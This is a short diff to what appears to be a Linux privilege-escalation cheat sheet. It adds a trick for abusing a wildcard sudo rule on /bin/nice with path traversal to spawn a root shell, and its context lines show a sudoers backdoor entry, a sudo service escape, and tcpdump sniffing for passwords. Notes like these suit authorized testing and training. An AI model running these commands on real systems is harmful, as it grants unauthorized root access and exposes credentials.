@@ -161,6 +161,9 @@ sudo -i    #Elevate directly to root by running i with sudo and supplying eve's 
 echo targetUser ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers
 kali@kali:~$ sudo -u steven /usr/sbin/service ../../../bin/sh    #Use sudo -u to run /service or other command as different user if other user has "nopasswd sudo rights" on the /service or other file
 
+(ALL : ALL) /bin/nice /notes/*  #Asterisk can be exploited using the following
+sudo /bin/nice /notes/../../bin/sh
+
 #TcpDump to Inspect Traffic (cannot be run without sudo permissions)
 #sudo tcpdump -i lo -A | grep "pass"    #capture traffic in and out of the loopback interface, dump its content in ASCII using  -A parameter. Filter traffic for the word "pass"
 
